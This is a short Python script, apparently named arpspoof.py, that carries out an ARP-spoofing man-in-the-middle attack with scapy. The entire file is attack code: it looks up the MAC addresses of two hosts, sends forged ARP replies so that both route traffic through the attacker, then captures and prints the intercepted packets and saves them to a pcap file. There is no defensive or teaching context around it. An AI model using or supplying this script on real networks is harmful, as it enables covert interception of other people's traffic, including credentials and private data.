from scapy.all import *
import socket
import time
import sys

def getMAC(ip):
    arpbroadcast = Ether(dst='FF:FF:FF:FF:FF:FF')/ARP(op=1, pdst=ip)
    received = srp(arpbroadcast, timeout=2)
    return received[0][0][1].hwsrc

def arppoison(hm, tm, tip, hip):
    send(ARP(op=2, pdst = tip, psrc = hip, hwdst = tm))
    send(ARP(op=2, pdst = hip, psrc = tip, hwdst = hm))

def sniffing(pkt):
    wrpcap('sniffed_packets.pcap', pkt, append=True)
    pkt.show()

def main():
    hostip = ""
    targetip = ""
    if len(sys.argv) > 4:
        if sys.argv[1] == "-t":
            targetip = sys.argv[2]
        elif sys.argv[1] == "-r":
            hostip = sys.argv[2]
        if sys.argv[3] == "-t":
            targetip = sys.argv[4]
        elif sys.argv[3] == "-r":
            hostip = sys.argv[4]
    else:
        print("usage error: python3 arpspoof.py -t <target 1 ip> -r <target 2 ip>")

    f = open("sniffed_packets.pcap", "w")
    f.write("")
    f.close
    hostmac = getMAC(hostip)
    targetmac = getMAC(targetip)
    while(True):
        arppoison(hostmac, targetmac, targetip, hostip)
        sniff(prn=sniffing)
        time.sleep(1.5)

main()
